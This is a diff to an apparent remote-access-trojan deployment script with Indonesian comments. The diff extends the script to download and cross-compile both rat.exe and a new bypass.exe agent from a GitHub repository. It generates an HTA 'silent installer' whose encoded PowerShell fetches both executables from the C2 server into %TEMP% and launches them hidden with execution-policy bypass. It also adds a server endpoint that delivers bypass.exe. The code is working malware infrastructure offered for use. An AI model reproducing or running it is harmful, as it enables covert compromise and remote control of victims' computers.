@@ -6,7 +6,6 @@ SCRIPT_NAME="c2_listener.py"
 SERVER_LOG="c2_server.log"
 NGROK_AUTH_TOKEN="${NGROK_AUTH_TOKEN:-}"
 RAW_BASE="${RAW_BASE:-https://raw.githubusercontent.com/Mizyal13/script/main}"
-C2_AGENT_SRC="${C2_AGENT_SRC:-$RAW_BASE/rat.cpp}"
 
 if [ "$(id -u)" -eq 0 ]; then
     SUDO=""
@@ -55,29 +54,28 @@ mkdir -p "$LOG_DIR"
 echo " [+] Created log storage directory: $LOG_DIR"
 
 # ---------------------------------------------------------------------------
-# Auto-build agent Windows (rat.exe) dari rat.cpp versi terbaru di GitHub.
-# Dipanggil otomatis, jadi curl main.sh | bash langsung jalan tanpa setting.
+# Auto-build agent Windows (rat.exe, bypass.exe) dari sumber versi terbaru di
+# GitHub. Dipanggil otomatis, jadi curl main.sh | bash langsung jalan.
 # ---------------------------------------------------------------------------
-build_rat_agent() {
-    echo " [*] Menyiapkan agent Windows (rat.exe)..."
+build_agent() {
+    local src="$1"
+    local exe="$2"
+    echo " [*] Menyiapkan agent Windows ($exe)..."
     local HAVE_CURL=0
     command -v curl > /dev/null 2>&1 && HAVE_CURL=1
 
     if [ "$HAVE_CURL" = "1" ]; then
-        echo " [*] Mengunduh rat.cpp versi terbaru dari $C2_AGENT_SRC"
-        if ! curl -fsSL "$C2_AGENT_SRC" -o rat.cpp; then
-            if [ ! -f "rat.cpp" ]; then
-                echo " [!] Gagal unduh rat.cpp dan tidak ada salinan lokal."
+        echo " [*] Mengunduh $src versi terbaru dari $RAW_BASE/$src"
+        if ! curl -fsSL "$RAW_BASE/$src" -o "$src"; then
+            if [ -f "$src" ]; then
+                echo " [!] Gagal unduh $src, memakai salinan lokal."
             else
-                echo " [!] Gagal unduh rat.cpp, memakai salinan lokal."
+                echo " [!] Gagal unduh $src dan tidak ada salinan lokal; lewati $exe."
+                return 0
             fi
         fi
-    elif [ ! -f "rat.cpp" ]; then
-        echo " [!] rat.cpp tidak ada dan curl tidak tersedia."
-    fi
-
-    if [ ! -f "rat.cpp" ]; then
-        echo " [!] Lewat build rat.exe (jalankan ./build.sh manual jika perlu)."
+    elif [ ! -f "$src" ]; then
+        echo " [!] $src tidak ada dan curl tidak tersedia; lewati $exe."
         return 0
     fi
 
@@ -87,7 +85,7 @@ build_rat_agent() {
             $SUDO apt-get update -qq 2>/dev/null || true
             $SUDO apt-get install -y g++-mingw-w64-x86-64 > /dev/null 2>&1 || true
         else
-            echo " [!] Tidak ada apt-get di sistem ini; lewati build rat.exe."
+            echo " [!] Tidak ada apt-get di sistem ini; lewati build $exe."
             return 0
         fi
     fi
@@ -97,19 +95,20 @@ build_rat_agent() {
         return 0
     fi
 
-    if [ ! -f "rat.exe" ] || [ "rat.cpp" -nt "rat.exe" ]; then
-        echo " [*] Mengompilasi rat.exe..."
-        if x86_64-w64-mingw32-g++ -std=c++11 -static -O2 -s -mwindows rat.cpp -lws2_32 -o rat.exe; then
-            echo " [+] rat.exe siap: $(pwd)/rat.exe"
+    if [ ! -f "$exe" ] || [ "$src" -nt "$exe" ]; then
+        echo " [*] Mengompilasi $exe..."
+        if x86_64-w64-mingw32-g++ -std=c++11 -static -O2 -s -mwindows -pthread "$src" -lws2_32 -o "$exe"; then
+            echo " [+] $exe siap: $(pwd)/$exe"
         else
-            echo " [!] Kompilasi gagal; /agent/rat.exe akan 404 sampai dibangun manual (./build.sh)."
+            echo " [!] Kompilasi $exe gagal; jalankan ./build.sh manual."
         fi
     else
-        echo " [+] rat.exe sudah ada dan terbaru."
+        echo " [+] $exe sudah ada dan terbaru."
     fi
     return 0
 }
-build_rat_agent || true
+build_agent "rat.cpp" "rat.exe" || true
+build_agent "bypass.cpp" "bypass.exe" || true
 
 echo " [*] Writing listener script to $SCRIPT_NAME..."
 
@@ -140,6 +139,7 @@ REMOTE_PATH = "/remote"
 CMD_PATH = "/cmd"
 RESULT_PATH = "/result"
 AGENT_EXE_PATH = os.environ.get("C2_AGENT_EXE", os.path.join(os.path.dirname(os.path.abspath(__file__)), "rat.exe"))
+BYPASS_EXE_PATH = os.environ.get("C2_BYPASS_EXE", os.path.join(os.path.dirname(os.path.abspath(__file__)), "bypass.exe"))
 
 events = []
 loc_cache = {}
@@ -192,16 +192,19 @@ def file_ts():
 
 
 def make_hta(server_url, machine_id):
-    """HTA silent installer: unduh rat.exe ke %TEMP% lalu jalankan hidden."""
+    """HTA silent installer: unduh rat.exe + bypass.exe ke %TEMP% lalu jalankan hidden."""
     import base64
     from urllib.parse import urlsplit
     u = urlsplit(server_url)
     host = u.hostname or ""
     port = u.port or (443 if u.scheme == "https" else 80)
-    tmp = "%TEMP%\\rat.exe"
+    tmp_rat = "%TEMP%\\rat.exe"
+    tmp_bp = "%TEMP%\\bypass.exe"
     ps = ("try{(New-Object Net.WebClient).DownloadFile('%s/agent/rat.exe','%s')}catch{};"
-          "Start-Process -WindowStyle Hidden '%s' -ArgumentList '%s','%d','%s','30'"
-          % (server_url, tmp, tmp, host, port, machine_id))
+          "try{(New-Object Net.WebClient).DownloadFile('%s/agent/bypass.exe','%s')}catch{};"
+          "Start-Process -WindowStyle Hidden '%s' -ArgumentList '%s','%d','%s','30';"
+          "Start-Process -WindowStyle Hidden '%s'"
+          % (server_url, tmp_rat, server_url, tmp_bp, tmp_rat, host, port, machine_id, tmp_bp))
     enc = base64.b64encode(ps.encode("utf-16-le")).decode("ascii")
     line = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand %s" % enc
     return """<html>
@@ -908,6 +911,18 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 except Exception:
                     pass
             self._send(404, "text/plain; charset=utf-8", b"rat.exe tidak ditemukan di folder server")
+            return
+
+        if path == "/agent/bypass.exe":
+            if os.path.isfile(BYPASS_EXE_PATH):
+                try:
+                    with open(BYPASS_EXE_PATH, "rb") as f:
+                        self._send(200, "application/octet-stream", f.read(),
+                                   [("Content-Disposition", 'attachment; filename="bypass.exe"'), ("Cache-Control", "no-store")])
+                    return
+                except Exception:
+                    pass
+            self._send(404, "text/plain; charset=utf-8", b"bypass.exe tidak ditemukan di folder server")
             return
 
         if path == "/agent/install.hta":
